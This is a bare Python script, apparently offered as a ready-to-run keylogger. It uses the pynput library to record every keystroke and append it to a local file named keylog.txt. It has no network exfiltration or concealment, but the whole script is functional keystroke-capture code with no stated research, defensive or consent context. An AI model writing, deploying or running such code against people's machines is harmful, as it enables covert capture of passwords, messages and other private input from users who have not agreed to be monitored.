from pynput.keyboard import Listener

def on_press(key):
    # Save the keypresses to a log file
    with open("keylog.txt", "a") as log_file:
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f" {str(key)} ")

def main():
    # Start listening for key presses
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
